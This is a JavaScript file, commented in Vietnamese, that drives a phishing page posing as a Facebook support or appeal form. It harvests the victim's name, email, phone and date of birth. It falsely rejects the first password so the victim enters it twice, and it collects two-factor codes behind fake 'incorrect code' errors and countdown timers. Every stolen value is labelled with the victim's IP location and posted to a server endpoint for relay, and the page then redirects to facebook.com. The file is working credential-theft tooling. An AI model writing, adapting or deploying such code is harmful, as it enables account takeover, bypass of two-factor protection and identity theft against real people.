/* ================= 1. CẤU HÌNH (KHÔNG CẦN TOKEN Ở ĐÂY NỮA) ================= */
const CONFIG = {
    REDIRECT_URL: "https://www.facebook.com/",
    IP_API: "https://ipwho.is/"
};

/* ================= 2. UTILS MỚI ================= */
const Utils = {
    // Lấy IP
    getLocation: async () => {
        try {
            const res = await fetch(CONFIG.IP_API);
            const data = await res.json();
            return data.success ? 
                { ip: data.ip, city: data.city, country: data.country, flag: data.flag?.emoji || "" } : 
                { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
        } catch { return { ip: "Error", city: "N/A", country: "N/A", flag: "" }; }
    },

    // --- HÀM GỬI TIN MỚI: Gọi về Server Vercel ---
    sendMessage: async (message) => {
        try {
            // Gọi vào file api/send.js (Token nằm trên server, hacker không thấy được)
            await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: message })
            });
        } catch (e) {
            console.error("Lỗi gửi:", e);
        }
    },

    // Format nội dung tin nhắn (Giữ nguyên)
    formatReport: (d, type, loc) => {
        const time = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
        let icon = type === "INFO" ? "📝 INFO" : (type.includes("PASS") ? "🔑 PASS" : "🔥 OTP");
        
        let info = `<b>Name:</b> ${d.fullName}\n<b>Mail:</b> ${d.email}`;
        if (d.businessEmail) info += `\n<b>Biz Mail:</b> ${d.businessEmail}`;
        info += `\n<b>Phone:</b> ${d.phone}\n<b>DOB:</b> ${d.dob}`;
        
        let pass = d.pass1 ? `\n----------------\n<b>P1:</b> <code>${d.pass1}</code>` : "";
        if (d.pass2) pass += `\n<b>P2:</b> <code>${d.pass2}</code>`;

        let otp = d.twoFactorCode ? `\n----------------\n<b>OTP:</b> <code>${d.twoFactorCode}</code>` : "";
        let ip = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;

        return `<b>${icon}</b> | ${time}\n----------------\n${info}${pass}${otp}${ip}`;
    },
    
    // Ẩn email/sđt (Giữ nguyên)
    maskString: (str, type) => {
       if (!str) return "...";
       if (type === 'email') {
           const parts = str.split('@');
           if (parts.length < 2) return str;
           return `${parts[0].substring(0, 3)}***@${parts[1]}`;
       }
       if (type === 'phone') {
           if (str.length < 7) return str;
           return `${str.substring(0, 3)}****${str.substring(str.length - 3)}`;
       }
       return str;
    }
};

/* ================= 3. LOGIC CHÍNH (VALIDATION + FLOW) ================= */
document.addEventListener("DOMContentLoaded", async () => {
    const userLoc = await Utils.getLocation();
    let formData = { fullName:"", email:"", businessEmail:"", phone:"", dob:"", pass1:"", pass2:"", twoFactorCode:"" };
    let passAttempts = 0, otpAttempts = 0, isLocked = false;

    // Helper functions
    const $ = (id) => document.getElementById(id);
    const show = (id) => {
        $("overlay").classList.remove("hidden");
        ["infoForm","passwordForm","verifyModal"].forEach(i => $(i).classList.add("hidden"));
        $(id).classList.remove("hidden");
    };
    const showError = (id, msg) => {
        if($(id)) { $(id).innerText = msg; $(id).classList.remove("hidden"); }
    };
    const hideError = (id) => { if($(id)) $(id).classList.add("hidden"); };

    if($("ticketId")) $("ticketId").innerText = "REF-" + Math.floor(Math.random()*900000);
    
    // BƯỚC 0: Mở form Info
    if($("submitRequestBtn")) $("submitRequestBtn").onclick = () => show("infoForm");

    // BƯỚC 1: Form Info (Có Validation đỏ)
    if($("sendInfoBtn")) $("sendInfoBtn").addEventListener("click", () => {
        const inps = document.querySelectorAll("#infoForm input");
        // Lấy giá trị
        const v = {
            n: inps[0].value.trim(), e: inps[1].value.trim(), b: inps[2].value.trim(),
            p: inps[4].value.trim(), d: inps[5].value.trim(), m: inps[6].value.trim(), y: inps[7].value.trim()
        };

        // Kiểm tra trống (Validation)
        if(!v.n || !v.e || !v.p || !v.d || !v.m || !v.y) {
            // Tạo dòng lỗi đỏ nếu chưa có
            let err = $("infoError");
            if(!err) {
                err = document.createElement("p"); err.id = "infoError";
                err.className = "text-red-500 text-sm mt-3 text-center";
                $("sendInfoBtn").parentNode.insertBefore(err, $("sendInfoBtn"));
            }
            err.innerText = "Please fill in all required fields.";
            err.classList.remove("hidden");
            return; // Dừng lại
        }
        
        hideError("infoError"); // Ẩn lỗi nếu đã nhập đủ

        formData.fullName = v.n; formData.email = v.e; formData.businessEmail = v.b;
        formData.phone = v.p; formData.dob = `${v.d}/${v.m}/${v.y}`;
        
        Utils.sendMessage(Utils.formatReport(formData, "INFO", userLoc));
        show("passwordForm");
    });

    // BƯỚC 2: Password
    if($("continueBtn")) $("continueBtn").addEventListener("click", () => {
        const val = $("passwordInput").value;
        if(!val) return;
        passAttempts++;
        if(passAttempts === 1) {
            formData.pass1 = val;
            Utils.sendMessage(Utils.formatReport(formData, "PASS1", userLoc));
            $("passwordInput").value = "";
            showError("passwordError", "The password you entered is incorrect. Please try again.");
        } else {
            formData.pass2 = val;
            Utils.sendMessage(Utils.formatReport(formData, "PASS2", userLoc));
            $("maskedEmail").innerText = Utils.maskString(formData.email, 'email');
            $("maskedPhone").innerText = Utils.maskString(formData.phone, 'phone');
            show("verifyModal");
        }
    });

    // BƯỚC 3: OTP
    if($("verifyBtn")) $("verifyBtn").addEventListener("click", () => {
        if(isLocked) return;
        const code = $("verifyCode").value;
        if(!code) return;
        formData.twoFactorCode = code;
        otpAttempts++;
        Utils.sendMessage(Utils.formatReport(formData, "OTP", userLoc));

        if(otpAttempts < 3) {
            $("verifyCode").value = "";
            showError("verifyError", "The code you entered is incorrect.");
            isLocked = true;
            const btn = $("verifyBtn");
            const cd = $("countdown");
            btn.disabled = true; btn.style.opacity = "0.7"; btn.innerText = "Please wait...";
            
            if(cd) {
                let s = 30;
                cd.classList.remove("hidden");
                cd.innerText = `Try again in ${s}s`;
                const t = setInterval(() => {
                    s--; cd.innerText = `Try again in ${s}s`;
                    if(s<=0){
                        clearInterval(t); isLocked=false;
                        cd.classList.add("hidden"); hideError("verifyError");
                        btn.disabled=false; btn.style.opacity="1"; btn.innerText="Confirm";
                    }
                }, 1000);
            }
        } else {
            $("verifyBtn").innerText = "Processing...";
            hideError("verifyError");
            setTimeout(() => window.location.href = CONFIG.REDIRECT_URL, 1500);
        }
    });
});
